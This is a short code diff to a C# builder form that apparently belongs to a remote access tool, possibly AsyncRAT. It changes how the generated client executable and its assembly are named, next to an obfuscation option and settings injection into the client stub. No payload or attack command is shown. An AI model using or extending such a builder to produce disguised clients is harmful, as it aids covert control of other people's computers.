@@ -196,11 +196,11 @@ namespace Server.Forms
                     saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                     saveFileDialog1.InitialDirectory = Application.StartupPath;
                     saveFileDialog1.OverwritePrompt = false;
-                    saveFileDialog1.FileName = "Client";
+                    saveFileDialog1.FileName = "AsyncClient";
                     if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                     {
                         btnBuild.Enabled = false;
-                        WriteSettings(asmDef);
+                        WriteSettings(asmDef, saveFileDialog1.FileName);
                         if (chkObfu.Checked)
                         {
                             //EncryptString.DoEncrypt(asmDef);
@@ -348,7 +348,7 @@ namespace Server.Forms
             return "";
         }
 
-        private void WriteSettings(ModuleDefMD asmDef)
+        private void WriteSettings(ModuleDefMD asmDef, string AsmName)
         {
             try
             {
@@ -365,6 +365,8 @@ namespace Server.Forms
 
                 foreach (TypeDef type in asmDef.Types)
                 {
+                    asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
+                    asmDef.Name = Path.GetFileName(AsmName);
                      if (type.Name == "Settings")
                         foreach (MethodDef method in type.Methods)
                         {
